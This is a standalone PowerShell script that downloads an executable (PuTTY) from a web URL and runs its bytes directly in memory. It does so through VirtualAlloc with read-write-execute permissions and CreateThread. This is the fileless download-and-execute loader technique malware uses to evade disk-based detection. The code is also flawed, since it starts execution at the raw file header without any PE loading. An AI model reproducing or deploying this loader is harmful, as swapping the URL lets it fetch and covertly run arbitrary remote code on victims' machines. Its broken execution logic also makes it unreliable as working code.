# URL of the native PE file
$url = "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe"

# Download the file bytes
$webClient = New-Object System.Net.WebClient
$bytes = $webClient.DownloadData($url)
$size = $bytes.Length

# Import necessary Windows API functions
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@

# Allocate memory with execute permissions (MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_EXECUTE_READWRITE = 0x40
$allocType = $MEM_COMMIT -bor $MEM_RESERVE

$addr = [Win32]::VirtualAlloc([IntPtr]::Zero, [UInt32]$size, $allocType, $PAGE_EXECUTE_READWRITE)
if ($addr -eq [IntPtr]::Zero) {
    Write-Error "Memory allocation failed."
    return
}

# Copy the bytes into the allocated memory
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $addr, $size)

# Create a thread that starts execution at the allocated memory address
$threadId = 0
$hThread = [Win32]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$threadId)
if ($hThread -eq [IntPtr]::Zero) {
    Write-Error "Thread creation failed."
    return
}

# Wait indefinitely for the thread to finish execution
[Win32]::WaitForSingleObject($hThread, 0xFFFFFFFF)
